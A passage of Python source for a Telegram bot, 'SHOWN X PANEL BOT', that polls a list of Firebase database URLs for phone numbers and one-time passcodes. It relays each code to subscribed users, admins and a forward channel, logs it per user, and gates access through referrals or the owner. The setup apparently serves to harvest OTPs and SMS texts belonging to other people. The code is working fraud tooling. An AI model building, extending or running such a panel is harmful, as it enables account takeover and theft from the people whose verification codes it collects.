#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SHOWN X PANEL BOT — v18.0-U1
PART 2 — Poll Loop · Background Tasks · All Handlers A
"""

# ══════════════════════════════════════════════════════════════════
#  OTP POLL LOOP
# ══════════════════════════════════════════════════════════════════

async def poll_all_databases(bot) -> None:
    global first_run
    session = await get_session()
    stale_mins = await gsint("otp_stale_mins", OTP_STALE_MINS)
    rate_limit = await gsint("otp_rate_limit", OTP_RATE_LIMIT)
    maintenance = await gsbool("maintenance_mode", False)
    if maintenance: return

    # Load blacklist
    async with db() as c:
        bl_rows = c.execute("SELECT phone FROM number_blacklist").fetchall()
    blacklist = {r["phone"] for r in bl_rows}

    # Load OTP alert format
    async with db() as c:
        fmt_row = c.execute("SELECT template FROM otp_format WHERE id=1").fetchone()
    otp_fmt = fmt_row["template"] if fmt_row else "📡 <b>NEW OTP</b>\n📱 {phone}\n🔑 {otp}\n🗄 {db}\n🕐 {time}"

    async def _poll_one(name: str, url: str) -> None:
        # Get custom path for this DB
        async with db() as c:
            meta = c.execute("SELECT custom_path FROM db_meta WHERE db_name=?", (name,)).fetchone()
        custom_path = meta["custom_path"] if meta else ""

        try:
            entries = await fetch_firebase(url, session, custom_path)
        except Exception as e:
            log.debug("Poll error %s: %s", name, e)
            return

        for entry in entries:
            uid = entry.get("_key", "")
            phone, otp = extract_otp(entry)

            # Skip if no data
            if not phone and not otp:
                continue

            # Skip stale
            if is_stale(entry, stale_mins):
                if uid: seen_ids.add(uid)
                continue

            # Skip duplicate
            if is_duplicate(phone, otp, name, uid):
                continue

            # First run — seed seen IDs only
            if first_run:
                continue

            # Skip blacklisted number
            if phone in blacklist:
                continue

            # Rate limit per DB
            if not check_rate_limit(name, rate_limit):
                log.debug("Rate limit hit for DB: %s", name)
                continue

            # Build alert
            raw_msg = entry.get("message") or entry.get("body") or entry.get("text") or ""
            alert = (
                f"<blockquote>{'━'*22}\n"
                f"📡 <b>NEW OTP RECEIVED</b>\n"
                f"{'━'*22}</blockquote>\n\n"
                f"<blockquote>"
                f"🗄 <b>DB:</b> {he(name)}\n"
                f"📱 <b>Phone:</b> <code>{he(phone)}</code>\n"
                f"🔑 <b>OTP:</b> <code>{he(otp)}</code>\n"
                f"💬 <b>Msg:</b> <code>{he(str(raw_msg)[:200])}</code>\n"
                f"🕐 <b>Time:</b> {datetime.now().strftime('%d %b %Y %H:%M:%S')}"
                f"</blockquote>"
            )

            # Copy button
            copy_kb = None
            if otp and _COPY_BTN:
                try:
                    copy_kb = InlineKeyboardMarkup([[_COPY_BTN(otp)]])
                except Exception:
                    copy_kb = None

            # Targets: allowed users + admins
            targets = set(allowed_users) | ADMIN_IDS

            # Forward channel
            fwd_ch = await get_setting("forward_channel", "")

            # Send to targets
            for tid in targets:
                try:
                    await bot.send_message(tid, alert,
                        parse_mode=ParseMode.HTML, reply_markup=copy_kb)
                except (Forbidden, BadRequest):
                    pass
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after)
                except TelegramError as e:
                    log.debug("Send error to %d: %s", tid, e)

            # Forward to channel
            if fwd_ch:
                try:
                    await bot.send_message(int(fwd_ch), alert, parse_mode=ParseMode.HTML)
                except Exception:
                    pass

            # Live monitor broadcast
            if otp:
                await broadcast_otp(bot, phone, otp, name, otp_fmt)

            # Log to User Hub for all targets
            for tid in targets:
                try:
                    await log_number_used(tid, phone, otp, name, url)
                except Exception:
                    pass

            # Analytics
            await log_otp_analytics(name, phone, otp)
            await log_act(0, "otp_received", f"{name}|{phone}|{otp}")

    tasks = [_poll_one(name, url) for name, url in list(DATABASES.items())]
    await asyncio.gather(*tasks, return_exceptions=True)
    first_run = False


async def poll_loop(bot) -> None:
    log.info("Poll loop started")
    while True:
        try:
            interval = await gsint("poll_interval", POLL_INTERVAL)
            await poll_all_databases(bot)
            await asyncio.sleep(max(5, interval))
        except asyncio.CancelledError:
            log.info("Poll loop cancelled"); break
        except Exception as e:
            log.error("Poll loop error: %s", e)
            await asyncio.sleep(10)


# ══════════════════════════════════════════════════════════════════
#  BACKGROUND TASKS
# ══════════════════════════════════════════════════════════════════

async def auto_backup_loop(bot) -> None:
    log.info("Auto backup loop started")
    while True:
        try:
            if await gsbool("auto_db_enabled", False):
                interval = await gsint("auto_db_interval", 3600)
                # Primary target
                target_raw = await get_setting("auto_db_group", "")
                if target_raw:
                    try: await send_backup(bot, int(target_raw))
                    except Exception as e: log.error("Auto backup primary: %s", e)
                # Multi targets
                extra = await gsjson("multi_backup_targets", [])
                for t in extra:
                    try: await send_backup(bot, int(t))
                    except Exception: pass
                await asyncio.sleep(max(300, interval))
            else:
                await asyncio.sleep(60)
        except asyncio.CancelledError: break
        except Exception as e:
            log.error("Backup loop: %s", e); await asyncio.sleep(60)


async def health_loop(bot) -> None:
    log.info("Firebase health loop started")
    while True:
        try:
            session = await get_session()
            results = await run_health_check(session)
            alive = sum(1 for s in results.values() if s=="alive")
            dead  = sum(1 for s in results.values() if s=="dead")
            log.info("Firebase health: %d alive, %d dead", alive, dead)

            # Alert admin if many dead
            if dead > 5:
                for aid in ADMIN_IDS:
                    try:
                        await bot.send_message(aid,
                            f"⚠️ <b>Firebase Alert:</b> {dead} DBs are dead!\n"
                            f"🟢 Alive: {alive} | 🔴 Dead: {dead}",
                            parse_mode=ParseMode.HTML)
                    except Exception: pass

            await asyncio.sleep(FB_HEALTH_INTERVAL)
        except asyncio.CancelledError: break
        except Exception as e:
            log.error("Health loop: %s", e); await asyncio.sleep(60)


async def ban_expiry_loop() -> None:
    """Auto-unban expired temp bans."""
    while True:
        try:
            now = datetime.utcnow()
            to_unban = []
            for uid, info in list(banned_users.items()):
                if info.get("until"):
                    try:
                        if datetime.fromisoformat(info["until"]) < now:
                            to_unban.append(uid)
                    except: pass
            for uid in to_unban:
                await unban_user(uid)
                log.info("Auto-unbanned %d (temp ban expired)", uid)
            await asyncio.sleep(60)
        except asyncio.CancelledError: break
        except Exception as e:
            log.error("Ban expiry loop: %s", e); await asyncio.sleep(60)


async def health_server() -> None:
    from aiohttp import web
    async def _h(req):
        return web.Response(
            text=json.dumps({
                "status": "ok", "version": BOT_VERSION,
                "dbs": len(DATABASES), "users": len(allowed_users),
            }),
            content_type="application/json",
        )
    app = web.Application()
    app.router.add_get("/", _h)
    app.router.add_get("/health", _h)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", HEALTH_CHECK_PORT).start()
    log.info("Health server on :%d", HEALTH_CHECK_PORT)


# ══════════════════════════════════════════════════════════════════
#  ACCESS GUARD
# ══════════════════════════════════════════════════════════════════

async def guard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if not user: return False
    await ensure_user(user.id, user.username, user.first_name)

    if is_banned(user.id):
        info = banned_users.get(user.id, {})
        reason = info.get("reason") or "No reason given"
        until  = fmt_dt(info.get("until")) if info.get("until") else "Permanent"
        text = (f"<blockquote>{'━'*22}\n🚫 <b>YOU ARE BANNED</b>\n{'━'*22}</blockquote>\n\n"
                f"<blockquote>❌ <b>Reason:</b> {he(reason)}\n"
                f"⏱ <b>Until:</b> {until}</blockquote>")
        if update.message: await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        elif update.callback_query:
            await update.callback_query.answer("🚫 You are banned", show_alert=True)
        return False

    if await has_access(user.id): return True

    # No access
    ref_link = f"https://t.me/{BOT_USERNAME.lstrip('@')}?start=ref_{user.id}"
    req   = await gsint("required_referrals", 2)
    count = await referral_count(user.id)
    owner = await get_setting("owner_contact", OWNER_CONTACT)
    text = (
        f"<blockquote>{'━'*22}\n🔒 <b>ACCESS REQUIRED</b>\n{'━'*22}</blockquote>\n\n"
        f"<blockquote>"
        f"⚡ You need access to use this panel.\n\n"
        f"📨 <b>Option 1:</b> Contact {he(owner)}\n\n"
        f"🔗 <b>Option 2:</b> Refer {req} friends:\n"
        f"<code>{he(ref_link)}</code>\n\n"
        f"👥 Your referrals: <b>{count}/{req}</b>"
        f"</blockquote>"
    )
    kb = InlineKeyboardMarkup([[
        _ikb("👑 Contact Owner", url=f"https://t.me/{OWNER_CONTACT.lstrip('@')}", style="primary"),
    ]])
    if update.callback_query:
        await update.callback_query.answer("🔒 Access required", show_alert=True)
    elif update.message:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    return False


# ══════════════════════════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user: return
    is_new = await ensure_user(user.id, user.username, user.first_name)
    await log_act(user.id, "start")

    # Referral
    args = context.args or []
    if args and args[0].startswith("ref_"):
        try:
            ref_id = int(args[0][4:])
            if ref_id != user.id:
                async with db() as c:
                    row = c.execute("SELECT referrals FROM all_users WHERE user_id=?", (ref_id,)).fetchone()
                    refs = json.loads(row["referrals"] or "[]") if row else []
                    if str(user.id) not in [str(x) for x in refs]:
                        refs.append(user.id)
                        c.execute("UPDATE all_users SET referrals=? WHERE user_id=?",
                                  (json.dumps(refs), ref_id))
        except Exception: pass

    text, media_id, media_type = await build_welcome(user)
    admin = is_admin(user.id)
    kb = main_menu_kb(admin)

    await send_rich_or_fallback(context.bot, user.id, text,
        media_id, media_type, reply_markup=kb)


# ══════════════════════════════════════════════════════════════════
#  /panel
# ══════════════════════════════════════════════════════════════════

async def cmd_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update, context): return
    alive = sum(1 for h in _fb_health.values() if h.get("status")=="alive")
    dead  = sum(1 for h in _fb_health.values() if h.get("status")=="dead")
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    text = ui_screen("📡", f"{brand} — OTP Panel",
        ui_box(
            ui_kv("🗄","Total DBs",    str(len(DATABASES))),
            ui_kv("🟢","Alive",        str(alive)),
            ui_kv("🔴","Dead",         str(dead)),
            ui_kv("👥","Allowed Users",str(len(allowed_users))),
        ),
        ui_box(f"💬 <i>{he(random.choice(PANEL_QUOTES))}</i>"),
        subtitle="Select a database to view",
        footer=f"🕐 {datetime.now().strftime('%H:%M:%S')}",
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
        reply_markup=db_panel_kb(0))


# ══════════════════════════════════════════════════════════════════
#  /status
# ══════════════════════════════════════════════════════════════════

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update, context): return
    alive = sum(1 for h in _fb_health.values() if h.get("status")=="alive")
    dead  = sum(1 for h in _fb_health.values() if h.get("status")=="dead")
    poll_int = await gsint("poll_interval", POLL_INTERVAL)
    maint    = await gsbool("maintenance_mode", False)
    mon_on   = update.effective_user.id in _monitor_subs
    text = ui_screen("📊","System Status",
        ui_box(
            ui_kv("🗄","Total DBs",   str(len(DATABASES))),
            ui_kv("🟢","Alive",       str(alive)),
            ui_kv("🔴","Dead",        str(dead)),
            ui_kv("👥","Allowed",     str(len(allowed_users))),
        ),
        ui_box(
            ui_kv("⏱","Poll Interval",f"{poll_int}s"),
            ui_kv("👁","Seen IDs",    str(len(seen_ids))),
            ui_status("Live Monitor",  mon_on),
            ui_status("Maintenance",   maint),
        ),
        footer=f"🕐 {datetime.now().strftime('%d %b %Y %H:%M:%S')}",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("🔥 Run Health Check", callback_data="db:health",      style="success"),
         _ikb("📡 Toggle Monitor",   callback_data="monitor:toggle", style="primary")],
        [_ikb("🔄 Refresh",          callback_data="status:refresh", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════════════════════
#  /hub — USER HUB
# ══════════════════════════════════════════════════════════════════

async def cmd_hub(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update, context): return
    await _show_hub(update, context, update.effective_user.id, 0, edit=False)


async def _show_hub(update: Update, context: ContextTypes.DEFAULT_TYPE,
                    uid: int, page: int, edit: bool = False) -> None:
    stats = await get_user_hub_stats(uid)
    rows, total = await get_user_hub(uid, page, 8)
    total_pages = max(1, (total+7)//8)

    if rows:
        lines = []
        for r in rows:
            ts    = r.get("timestamp","")[:16].replace("T"," ")
            phone = r.get("phone") or "—"
            otp   = r.get("otp")   or "—"
            dbn   = r.get("db_name") or "—"
            lines.append(
                f"📱 <code>{he(phone)}</code> | 🔑 <code>{he(otp)}</code>\n"
                f"   🗄 {he(dbn[:20])} · 🕐 {ts}"
            )
        entries = ui_box("\n\n".join(lines))
    else:
        entries = ui_box("📭 No number history yet.")

    text = ui_screen("👤","User Hub",
        ui_box(
            ui_kv("📊","Total Hits",    str(stats["total"])),
            ui_kv("📱","Unique Numbers",str(stats["unique_phones"])),
            ui_kv("🕐","Last Active",   fmt_dt(stats["last_active"])),
        ),
        entries,
        subtitle=f"Page {page+1} of {total_pages}",
    )
    nav = []
    if page > 0:
        nav.append(_ikb("⬅️", callback_data=f"hub:page:{page-1}", style="primary"))
    nav.append(_ikb(f"{page+1}/{total_pages}", callback_data="noop", style="primary"))
    if page < total_pages-1:
        nav.append(_ikb("➡️", callback_data=f"hub:page:{page+1}", style="primary"))

    rows_kb = []
    if nav: rows_kb.append(nav)
    rows_kb.append([
        _ikb("🔍 Search Number", callback_data="hub:search",  style="success"),
        _ikb("📤 Export CSV",    callback_data="hub:export",  style="primary"),
    ])
    rows_kb.append([_ikb("🗑 Clear History", callback_data="hub:clear", style="danger")])
    rows_kb.append(back_row("home"))
    kb = InlineKeyboardMarkup(rows_kb)

    if edit and update.callback_query:
        try: await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except BadRequest: pass
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════════════════════
#  /admin
# ══════════════════════════════════════════════════════════════════

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admins only."); return
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    alive = sum(1 for h in _fb_health.values() if h.get("status")=="alive")
    async with db() as c:
        total_users = c.execute("SELECT COUNT(*) FROM all_users").fetchone()[0]
    text = ui_screen("👑", f"{brand} — Admin Panel",
        ui_box(
            ui_kv("🗄","Total DBs",   str(len(DATABASES))),
            ui_kv("🟢","Alive",       str(alive)),
            ui_kv("👥","Total Users", str(total_users)),
            ui_kv("🔑","Allowed",     str(len(allowed_users))),
            ui_kv("🚫","Banned",      str(len(banned_users))),
            ui_kv("👑","Admins",      str(len(ADMIN_IDS))),
        ),
        footer="Select a section below",
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
        reply_markup=admin_menu_kb())


# ══════════════════════════════════════════════════════════════════
#  /help
# ══════════════════════════════════════════════════════════════════

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    text = ui_screen("❓", f"{brand} — Help",
        ui_box(
            "📡 <b>Panel</b> — Browse all DBs + live status",
            "📊 <b>Status</b> — System health overview",
            "👤 <b>My Hub</b> — Your full number history",
            "❓ <b>Help</b> — This screen",
        ),
        ui_box(
            "🗄 <b>DB Manager</b> — Add/remove/view DBs",
            "🔥 <b>Firebase Health</b> — Ping all DBs live",
            "📡 <b>Live Monitor</b> — Real-time OTP alerts",
            "💾 <b>Backup</b> — Manual/auto gzip backups",
            "🧬 <b>Clone Manager</b> — Duplicate DB configs",
            "🎨 <b>Customize</b> — Welcome text + media (A/B)",
            "👥 <b>Users</b> — Grant/revoke access + tiers",
            "🚫 <b>Ban Manager</b> — Temp/perm ban system",
            "📊 <b>Analytics</b> — OTP stats + peak hours",
            "⚙️ <b>Settings</b> — Full bot config",
        ),
        ui_box(
            "/grant UID · /revoke UID · /ban UID [hours] [reason]",
            "/unban UID · /adddb NAME URL · /removedb NAME",
            "/backup · /monitor · /health · /stats · /addadmin UID",
        ),
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════════════════════
#  TEXT HANDLER — Reply keyboard router
# ══════════════════════════════════════════════════════════════════

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    user = update.effective_user

    # Pending action check first
    pa = pending_action.get(user.id)
    if pa:
        await _handle_pending(update, context, pa, text)
        return

    routes = {
        "📡 Panel":           cmd_panel,
        "📊 Status":          cmd_status,
        "👤 My Hub":          cmd_hub,
        "❓ Help":            cmd_help,
        "👑 Admin Panel":     cmd_admin,
        "🗄 DB Manager":      _txt_db_manager,
        "🔥 Firebase Health": _txt_health,
        "📡 Live Monitor":    _txt_monitor,
        "💾 Backup":          _txt_backup,
        "🧬 Clone Manager":   _txt_clone,
        "🎨 Customize":       _txt_customize,
        "👥 Users":           _txt_users,
        "🚫 Ban Manager":     _txt_ban_manager,
        "📊 Analytics":       _txt_analytics,
        "⚙️ Settings":        _txt_settings,
        "📋 Activity Log":    _txt_activity,
        "⬅️ Back":            _go_home,
    }
    fn = routes.get(text)
    if fn: await fn(update, context)


# ══════════════════════════════════════════════════════════════════
#  MEDIA HANDLER — Welcome screen media input
# ══════════════════════════════════════════════════════════════════

async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    pa = pending_action.get(user.id)
    if not pa or pa.get("action") not in ("set_welcome_media","set_welcome_media_b"): return
    msg = update.message
    if msg.photo:      fid, mt = msg.photo[-1].file_id, "photo"
    elif msg.video:    fid, mt = msg.video.file_id, "video"
    elif msg.animation:fid, mt = msg.animation.file_id, "animation"
    else: return

    is_b = pa.get("action") == "set_welcome_media_b"
    if is_b:
        await set_welcome(media_file_id_b=fid, media_type_b=mt)
    else:
        await set_welcome(media_file_id=fid, media_type=mt)
    pending_action.pop(user.id, None)
    variant = "B" if is_b else "A"
    await update.message.reply_text(
        f"✅ <b>Welcome media ({variant}) updated!</b> Type: <code>{mt}</code>",
        parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════════════════════
#  PENDING ACTION HANDLER
# ══════════════════════════════════════════════════════════════════

async def _handle_pending(update: Update, context: ContextTypes.DEFAULT_TYPE,
                           pa: dict, text: str) -> None:
    user = update.effective_user
    action = pa.get("action")

    if action == "add_db":
        parts = text.strip().split(None, 1)
        if len(parts) != 2 or not parts[1].startswith("http"):
            await update.message.reply_text(
                "❌ Format: <b>DB_NAME https://url</b>", parse_mode=ParseMode.HTML); return
        name, url = parts[0], parts[1]
        # Validate URL
        session = await get_session()
        await update.message.reply_text("⏳ Validating URL...")
        valid = await validate_fb_url(url, session)
        if not valid:
            await update.message.reply_text(
                f"⚠️ <b>Warning:</b> URL seems unreachable, adding anyway.\n"
                f"✅ Added: <code>{he(name)}</code>", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(
                f"✅ <b>Added + Verified:</b> <code>{he(name)}</code>", parse_mode=ParseMode.HTML)
        DATABASES[name] = url
        pending_action.pop(user.id, None)

    elif action == "import_dbs":
        # Expect JSON: {"NAME": "URL", ...}
        try:
            data = json.loads(text)
            added = 0
            for name, url in data.items():
                if name and url.startswith("http"):
                    DATABASES[name] = url; added += 1
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Imported <b>{added}</b> databases.", parse_mode=ParseMode.HTML)
        except Exception:
            await update.message.reply_text("❌ Invalid JSON. Send: <code>{\"NAME\": \"URL\"}</code>",
                parse_mode=ParseMode.HTML)

    elif action == "grant_user":
        try:
            uid = int(text.strip())
            await grant_access(uid, user.id)
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Access granted to <code>{uid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid user ID")

    elif action == "revoke_user":
        try:
            uid = int(text.strip())
            await revoke_access(uid)
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"🚫 Revoked: <code>{uid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid user ID")

    elif action == "ban_user":
        # Format: UID [hours] [reason]
        parts = text.strip().split(None, 2)
        try:
            uid = int(parts[0])
            hours = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
            reason = parts[2] if len(parts) > 2 else (parts[1] if len(parts) > 1 and not parts[1].isdigit() else "No reason")
            await ban_user(uid, user.id, reason, hours)
            pending_action.pop(user.id, None)
            until_str = f"{hours}h" if hours else "Permanent"
            await update.message.reply_text(
                f"🚫 <b>Banned:</b> <code>{uid}</code>\n"
                f"⏱ Until: {until_str}\n❌ Reason: {he(reason)}",
                parse_mode=ParseMode.HTML)
        except (ValueError, IndexError):
            await update.message.reply_text("❌ Format: <code>USER_ID [hours] [reason]</code>",
                parse_mode=ParseMode.HTML)

    elif action == "unban_user":
        try:
            uid = int(text.strip())
            await unban_user(uid)
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Unbanned: <code>{uid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid user ID")

    elif action == "add_admin":
        try:
            uid = int(text.strip())
            ADMIN_IDS.add(uid)
            async with db() as c:
                c.execute("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) VALUES(?,?,?)",
                          (uid, user.id, datetime.utcnow().isoformat()))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"👑 Admin added: <code>{uid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid user ID")

    elif action == "set_welcome_text":
        await set_welcome(text=text)
        pending_action.pop(user.id, None)
        await update.message.reply_text("✅ <b>Welcome text (A) updated!</b>", parse_mode=ParseMode.HTML)

    elif action == "set_welcome_text_b":
        await set_welcome(text_b=text)
        pending_action.pop(user.id, None)
        await update.message.reply_text("✅ <b>Welcome text (B) updated!</b>", parse_mode=ParseMode.HTML)

    elif action == "set_otp_format":
        await set_setting("otp_fmt_template", text)
        async with db() as c:
            c.execute("UPDATE otp_format SET template=? WHERE id=1", (text,))
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            "✅ <b>OTP alert format updated!</b>\n\n"
            "Variables: <code>{phone}</code> <code>{otp}</code> <code>{db}</code> <code>{time}</code>",
            parse_mode=ParseMode.HTML)

    elif action == "set_backup_target":
        try:
            cid = int(text.strip())
            await set_setting("auto_db_group", str(cid))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Backup target: <code>{cid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid chat ID")

    elif action == "add_backup_target":
        try:
            cid = int(text.strip())
            targets = await gsjson("multi_backup_targets", [])
            if str(cid) not in [str(x) for x in targets]:
                targets.append(cid)
                await set_setting("multi_backup_targets", json.dumps(targets))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Added backup target: <code>{cid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid chat ID")

    elif action == "clone_db":
        parts = text.strip().split(None, 1)
        if len(parts) != 2:
            await update.message.reply_text(
                "❌ Format: <b>SOURCE_NAME NEW_NAME</b>", parse_mode=ParseMode.HTML); return
        ok = await clone_database(parts[0], parts[1])
        pending_action.pop(user.id, None)
        if ok:
            await update.message.reply_text(
                f"✅ Cloned: <code>{he(parts[0])}</code> → <code>{he(parts[1])}</code>",
                parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"❌ Source <code>{he(parts[0])}</code> not found.",
                parse_mode=ParseMode.HTML)

    elif action == "set_poll_interval":
        try:
            val = max(5, int(text.strip()))
            await set_setting("poll_interval", str(val))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Poll interval: <b>{val}s</b>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a number (seconds, min 5)")

    elif action == "set_refs_required":
        try:
            val = max(1, int(text.strip()))
            await set_setting("required_referrals", str(val))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Referrals required: <b>{val}</b>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a number")

    elif action == "set_brand":
        name = text.strip()[:50]
        await set_setting("bot_brand_name", name)
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            f"✅ Brand name: <b>{he(name)}</b>", parse_mode=ParseMode.HTML)

    elif action == "set_forward_channel":
        try:
            cid = int(text.strip())
            await set_setting("forward_channel", str(cid))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Forward channel: <code>{cid}</code>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a valid channel ID (e.g. -100xxxxxxxxx)")

    elif action == "set_rate_limit":
        try:
            val = max(1, int(text.strip()))
            await set_setting("otp_rate_limit", str(val))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Rate limit: <b>{val} OTPs/min</b> per DB", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a number")

    elif action == "set_stale_mins":
        try:
            val = max(1, int(text.strip()))
            await set_setting("otp_stale_mins", str(val))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Stale OTP threshold: <b>{val} min</b>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Send a number (minutes)")

    elif action == "add_blacklist":
        phone = text.strip()
        async with db() as c:
            c.execute("INSERT OR IGNORE INTO number_blacklist(phone,added_at,reason) VALUES(?,?,?)",
                      (phone, datetime.utcnow().isoformat(), "admin"))
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            f"🚫 Blacklisted: <code>{he(phone)}</code>", parse_mode=ParseMode.HTML)

    elif action == "search_hub":
        phone = text.strip()
        results = await search_user_hub(user.id, phone)
        if results:
            lines = []
            for r in results:
                ts = r.get("timestamp","")[:16].replace("T"," ")
                lines.append(f"📱 <code>{he(r['phone'])}</code> | 🔑 <code>{he(r['otp'] or '—')}</code>\n"
                             f"   🗄 {he(r['db_name'] or '—')} · 🕐 {ts}")
            text_out = ui_screen("🔍","Search Results",
                ui_box(f"🔎 Query: <code>{he(phone)}</code>\n📊 Found: {len(results)}"),
                ui_box("\n\n".join(lines)))
        else:
            text_out = ui_screen("🔍","Search Results",
                ui_box(f"📭 No results for: <code>{he(phone)}</code>"))
        pending_action.pop(user.id, None)
        await update.message.reply_text(text_out, parse_mode=ParseMode.HTML)

    elif action == "broadcast":
        pending_action.pop(user.id, None)
        async with db() as c:
            rows = c.execute("SELECT user_id FROM all_users").fetchall()
        targets = [r["user_id"] for r in rows]
        sent = failed = 0
        for tid in targets:
            try:
                await context.bot.send_message(tid, text, parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.05)
            except Exception: failed += 1
        await update.message.reply_text(
            f"📡 <b>Broadcast done</b>\n✅ Sent: <b>{sent}</b> | ❌ Failed: <b>{failed}</b>",
            parse_mode=ParseMode.HTML)

    elif action == "set_db_notes":
        db_name = pa.get("db_name","")
        async with db() as c:
            c.execute("INSERT INTO db_meta(db_name,notes) VALUES(?,?) "
                      "ON CONFLICT(db_name) DO UPDATE SET notes=excluded.notes",
                      (db_name, text.strip()))
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            f"✅ Notes saved for <code>{he(db_name)}</code>", parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════════════════════
#  ADMIN TEXT SECTION HANDLERS
# ══════════════════════════════════════════════════════════════════

async def _txt_db_manager(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    alive = sum(1 for h in _fb_health.values() if h.get("status")=="alive")
    dead  = sum(1 for h in _fb_health.values() if h.get("status")=="dead")
    text = ui_screen("🗄","Database Manager",
        ui_box(
            ui_kv("📦","Total DBs",str(len(DATABASES))),
            ui_kv("🟢","Alive",    str(alive)),
            ui_kv("🔴","Dead",     str(dead)),
        ),
        subtitle="Manage your Firebase databases",
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=db_panel_kb(0))


async def _txt_health(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    msg = await update.message.reply_text("⏳ <b>Running health check on all DBs...</b>",
        parse_mode=ParseMode.HTML)
    session = await get_session()
    results = await run_health_check(session)
    alive = sum(1 for s in results.values() if s=="alive")
    dead  = sum(1 for s in results.values() if s=="dead")
    lines = [f"{'🟢' if s=='alive' else '🔴'} {he(n[:30])}"
             for n,s in results.items()]
    block = ui_box("\n".join(lines[:30]))
    if len(lines) > 30: block += f"\n<i>+{len(lines)-30} more</i>"
    text = ui_screen("🔥","Firebase Health Report",
        ui_box(ui_kv("🟢","Alive",str(alive)),
               ui_kv("🔴","Dead", str(dead)),
               ui_kv("📊","Total",str(len(results)))),
        block,
        footer=f"Checked: {datetime.now().strftime('%H:%M:%S')}",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("🗑 Remove All Dead", callback_data="db:remove_dead", style="danger"),
         _ikb("🔄 Recheck",         callback_data="db:health",      style="success")],
    ])
    try: await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    except BadRequest: await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    uid = update.effective_user.id
    is_on = uid in _monitor_subs
    text = ui_screen("📡","Live Monitor",
        ui_box(
            ui_status("Your Monitor", is_on),
            ui_kv("👥","Subscribers",str(len(_monitor_subs))),
        ),
        subtitle="Real-time OTP alerts as they arrive",
    )
